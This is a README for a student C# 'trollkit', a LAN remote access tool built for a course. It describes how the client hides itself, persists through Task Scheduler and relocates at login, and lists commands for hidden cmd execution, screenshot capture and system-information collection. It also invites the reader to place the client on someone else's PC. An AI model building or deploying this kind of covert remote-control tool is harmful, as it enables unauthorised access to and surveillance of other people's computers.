# Remote-Access-Trollkit
This is the git repo for the trollkit application developed for C# 2 at NHL Stenden.

## What we build
This is a remote access tool with wich you can make another pc do "funny" actions.  
The trollkit consists of a host (the pc that issues the commands) and a client(the pc that executes the commands).  

## How to use
After compiling the project in Visual Studio 2019 you will end up with 2 .exe's and one .dll in the projects \bin\Debug folders.
You do not need to copy the dll anywhere, this is linked inside both executables at compile time.  
For this to work your target machine and host machine need to be in the same LAN.
#### Client installation
Now to start using the application you need to get the client executable on a pc you want to troll, the way you do this is completely up to you. 
Once you run the application you will notice that the executable disappears, this happens because the client copy's itself into a random directory in the %USERPROFILE% folder. The application has also placed itself in the TaskScheduler with a task that runs everytime at user login. When this happens the application is moved again to a different location.
#### Server installation
To get the host application running all you need to do is run the executable, the application takes care of the rest.  
The clients on your LAN will find the host application through a broadcast message over the broadcast address of your router.  
Once a handshake is established the client will send a connection request to port 6969 of the host.  
And then the client will appear in the connected client list.

See below for a detailed list of all the possible actions the trollkit can perform

## Fixed values

### Pipeline handler Code
```csharp
private void Receiver_OnDataReceived(TransferCommandObject Object)
{
	if(handlers.ContainsKey(Object.Handler))
	{
		handlers[Object.Handler].HandleCommand(Object);
	}
}
```

### Pipeline handler Commands
In order to send request between host and client we used a fixed set of commands and handlers.
Each of the handlers listed below can send or receive data based on their given commands.

#### TaskHandler (client)
Command | Value | Description
------- | ----- | -----------
DeleteTask | (none) | Removes the task replication task from the local taskscheduler in Windows.

#### AudioHandler (client)
Command | Value | Description
------- | ----- | -----------
PlayBeep | "frequency,duration" | Makes a beep on the client, the values decide how the beep sounds.
Jeff | (none) | Plays the my name is jeff sound on the client
WesselMove | (none) | Plays the echt een wessel move sound on the client.
VolumeUp | (none) | Ups the volume on the client
VolumeDown | (none) | Downs the volume on the client
Mute | (none) | Mutes the volume on the client
PlayPause | (none) | Triggers the playback of the default player
NextTrack | (none) | Skips whatever is playing to the next track
PreviousTrack | (none) | Skips whatever is playing to the previous track

#### VisualsHandler (client & server)
Command | Target | Type | Value | Description
------- | ------ | ---- | ----- | -----------
BlackScreen | client | Command | (none) | Turns the screen of the client off.
TextBox | client | Command | "textToDisplay" | Shows a message box on the clients screen
ShowImage | client | Command | "base64Image" | Shows an image on the clients screen
OpenSite | client | Command | "url" | Opens a website on the users screen
SetBackground | client | Command | "base64Image" | Sets the provided image as the users background (also disables wallpaper engine)
MakeScreenshot | client | Command | "monitorNumber" | Tells the client to make a screenshot and then send it back.
ScreenshotResponse | server | Response | "json object" | Contains the base64 string for the screenshot.

#### WindowsHandler (client)
Command | Value | Description
------- | ----- | -----------
MousePosition | "x,y" | Sets the cursor of the client to the provided location
Command | "{hidden;show},command" | runs a cmd command depending if it shows or not.
LockWindows | (none) | Locks your pc (the same as pressing win+L)
AltTab | (none) | Sends a randomized alt+tab command to the client.


#### CMDHandler (client & server)
Command | Target | Type | Value | Description
------- | ------ | ---- | ----- | -----------
ExecuteCMD | client | Command | "command and args" | executes the given command and sends back the response
StopCMD | client | Command | (none) | Stops the cmd process on the client
CMDResponse | server | Response | "response text" | returns whatever was outputted by the remote CMD

#### SystemInfoHandler (client & server)
Command | Target | Type | Value | Description
------- | ------ | ---- | ----- | -----------
GetClientInfo | client | Command | (none) | Tells the client that it needs to start sending back its system info.
ComputerName | server | Data | "PCNAME\UserName" | Gets the pcname and username combo from the client.
CPU | server | Data | "cpu info" | Gets info about the clients CPU
Drives | server | Data | "string with drives" | Gets all the drives on the client pc
ProfilePicture | server | Data | "base64String" | Gets the base64 of the users profile picture in Windows.
RAM | server | Data | "RAM" | Gets the ram thats available in the system
WindowsVersion | server | Data | "Windows Version" | Gets the clients Windows Version
GPU | server | Data | "GPU name string" | Description of the gpu
Monitors | server | Data | "json object" | json object containg monitor id and monitor name.

### Data headers
In order to keep perfect track of data that is being sent and data that is received we thought of a clever way to devide the byte streams.  
The first 21 bytes of each 1048576 byte packet is made up of 'header' data that tells the program what to expect of the next piece of data.

The guidelines for received data are:

first byte is for a type check:
```
0x1A: Response  
0x1B: Command  
0x1C: Data
```
the 2 bytes after that are for data length:
```
0x0001: 1x 2027 bytes sets  
0x001B: 27x 2027 bytes sets  
0x0022: 34x 2027 bytes sets  
0x012C: 300x 2027 bytes sets etc...  
```
the 2 bytes after that indicate the series of data:
```
0x0001: 1/N byte set  
0x001A: 26/N byte set  
0x014A: 420/N byte set etc...  
```
the next 16 bytes are unique id:
```
0x00112233445566778899AABBCCDDFF00: d479950c-d020-46e2-b809-634dc634c9f6
```
